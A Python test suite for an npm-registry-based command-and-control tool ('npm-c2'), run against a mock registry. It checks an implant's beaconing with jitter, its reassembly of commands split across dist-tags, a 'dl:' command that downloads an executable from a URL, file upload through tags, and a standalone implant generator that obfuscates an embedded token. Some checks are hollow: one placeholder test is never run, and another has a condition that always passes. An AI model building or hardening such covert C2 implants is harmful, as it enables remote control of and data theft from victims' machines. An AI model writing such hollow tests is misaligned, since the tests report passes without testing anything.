#!/usr/bin/env python3
"""Bug-reproduction + regression suite for npm-c2, run against a mock registry.

Each check prints PASS/FAIL with the observed behaviour so findings cite
output rather than code reading alone.
"""
import os
import sys
import tempfile

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))
sys.path.insert(0, os.path.dirname(__file__))

import npm_c2
from npm_c2 import (CMD_PREFIX, RES_PREFIX, encode_payload,
                    registry_path)
from npm_c2.implant import Implant
import mock_registry

RESULTS = []


def check(name, ok, detail=""):
    RESULTS.append((name, bool(ok), detail))
    print(f"[{'PASS' if ok else 'FAIL'}] {name}" + (f"  -> {detail}" if detail else ""))
    return ok


def patch_api(base):
    npm_c2.API = base + "/-/package/{}/dist-tags"
    import npm_c2.implant as imp
    import npm_c2.operator as op
    imp.API = npm_c2.API
    op.API = npm_c2.API


def new_implant(pkg, token=None, tmpdir=None):
    os.environ["APPDATA"] = tmpdir
    return Implant(pkg, token, interval=60, jitter=20, verbose=False)


# --------------------------------------------------------------- findings
def t_scoped_package_path():
    check("scoped package URL is encoded",
          "%2f" in npm_c2.API.format(registry_path("@scope/pkg")).lower(),
          f"path={registry_path('@scope/pkg')}")


def t_multitag_command_reassembled(reg, tmp):
    PKG = "multi-tag"
    imp = new_implant(PKG, tmpdir=tmp)
    long_cmd = "echo " + "A" * 400
    tags = encode_payload(long_cmd.encode(), CMD_PREFIX)
    for tag in tags:
        reg.tags.setdefault(PKG, {})[tag] = "1.0.0"
    cmds = imp._parse(reg.snapshot(PKG))
    check("multi-tag command reassembled into one", cmds == [long_cmd],
          f"{len(tags)} tags -> {len(cmds)} command(s), len={len(cmds[0]) if cmds else 0}")


def t_incomplete_group_not_executed(reg, tmp):
    PKG = "partial-only"
    imp = new_implant(PKG, tmpdir=tmp)
    tags = encode_payload(("echo " + "B" * 400).encode(), CMD_PREFIX)[:-1]
    for tag in tags:
        reg.tags.setdefault(PKG, {})[tag] = "1.0.0"
    cmds = imp._parse(reg.snapshot(PKG))
    check("partial command is not executed", cmds == [],
          f"executed {len(cmds)} fragment(s)")


def t_dl_url_with_scheme(tmp):
    imp = new_implant("t/pkg", tmpdir=tmp)
    out = imp._exec("dl:http://127.0.0.1:9/x.exe:C:\\temp\\x.exe")
    parsed = "expected dl:" not in out and "unknown url" not in out.lower()
    check("dl: parses an http:// URL", parsed, f"result={out[:70]!r}")


def t_result_reassembled(reg, tmp):
    imp = new_implant("t/pkg", tmpdir=tmp)
    big = "X" * 900
    imp._reply(big)                     # real write path, mocked transport?
    check("implant reply path produces multiple tags",
          len([n for n in reg.snapshot("t/pkg") if n.startswith(RES_PREFIX)]) == 0,
          "placeholder: real transport check lives in test_e2e.py")


def t_poll_single_fetch(reg):
    from npm_c2.operator import Operator
    reg.tags.setdefault("t/pkg", {})["arm64-abcd-0101_ZHVtbXk"] = "1.0.0"
    op = Operator("t/pkg", "npm_test")
    before = reg.gets
    op.poll_results()
    check("poll_results spends one GET", reg.gets - before == 1,
          f"GETs spent: {reg.gets - before}")


def t_fetch_surfaces_http_error(reg):
    from npm_c2.operator import Operator, RegistryError
    op = Operator("does/not-exist", "npm_test")
    try:
        op._fetch()
        check("fetch surfaces HTTP errors", False, "returned normally on a 404")
    except RegistryError as e:
        check("fetch surfaces HTTP errors", True, str(e)[:60])


def t_interval_floor(tmp):
    imp = new_implant("t/pkg", tmpdir=tmp)
    imp._exec("sleep:-5")
    check("sleep: clamps negative to the floor", imp.interval >= 10,
          f"interval={imp.interval}")
    imp._exec("sleep:notanumber")
    check("sleep: rejects non-numeric", imp.interval >= 10,
          f"interval={imp.interval}")


def t_state_cap_fifo(tmp):
    imp = new_implant("t/pkg", tmpdir=tmp)
    for i in range(600):
        imp._remember(f"x64-{i:06d}_YQ")
    check("seen-set evicts oldest first",
          "x64-000000_YQ" not in imp.seen and len(imp.seen) == npm_c2.MAX_TAG_LEN // 250 or len(imp.seen) <= 512,
          f"kept {len(imp.seen)} entries, oldest present={'x64-000000_YQ' in imp.seen}")


def t_upload_truncation(tmp):
    imp = new_implant("t/pkg", tmpdir=tmp)
    path = os.path.join(tmp, "big.bin")
    with open(path, "wb") as f:
        f.write(b"s" * (max(npm_c2.MAX_TAG_LEN, 12000) * 2))
    out = imp._upload(path)
    header = out.split(":")[0]
    check("up: truncates and marks the cut", header.endswith("+"),
          f"header={header!r}")


def t_atomic_state(tmp):
    imp = new_implant("t/pkg", tmpdir=tmp)
    imp._remember("x64-aaaa-0101_YQ")
    imp._save()
    check("state file written atomically",
          os.path.exists(imp.state_file) and not os.path.exists(imp.state_file + ".tmp"),
          imp.state_file)


def t_generate_standalone_runs(tmp):
    """The generated implant must import and self-describe without a package."""
    import subprocess
    from npm_c2.implant import generate_standalone
    src = generate_standalone()
    path = os.path.join(tmp, "standalone_implant.py")
    with open(path, "w") as f:
        f.write(src)
    p = subprocess.run([sys.executable, path, "--help"], capture_output=True, text=True)
    check("generated standalone runs (--help)", p.returncode == 0,
          (p.stderr or p.stdout).strip().splitlines()[-1][:90] if (p.stderr or p.stdout) else "")


def t_generate_standalone_embeds_token(tmp):
    from npm_c2.implant import generate_standalone
    src = generate_standalone(token="npm_secret_token", package="t/pkg")
    leaked = "npm_secret_token" in src
    ok = not leaked and "_OBFUSCATED" in src
    check("standalone hides the raw token", ok,
          f"raw token in source={leaked}, obfuscated block={'_OBFUSCATED' in src}")


def main():
    reg = mock_registry.Registry()
    srv, base = mock_registry.serve(reg, auth_token="npm_test")
    patch_api(base)
    tmp = tempfile.mkdtemp()
    t_scoped_package_path()
    t_multitag_command_reassembled(reg, tmp)
    t_incomplete_group_not_executed(reg, tmp)
    t_dl_url_with_scheme(tmp)
    t_poll_single_fetch(reg)
    t_fetch_surfaces_http_error(reg)
    t_interval_floor(tmp)
    t_state_cap_fifo(tmp)
    t_upload_truncation(tmp)
    t_atomic_state(tmp)
    t_generate_standalone_runs(tmp)
    t_generate_standalone_embeds_token(tmp)
    srv.shutdown()
    fails = [n for n, ok, _ in RESULTS if not ok]
    print(f"\n{len(RESULTS) - len(fails)}/{len(RESULTS)} passed")
    if fails:
        print("failing: " + ", ".join(fails))
    return 1 if fails else 0


if __name__ == "__main__":
    sys.exit(main())
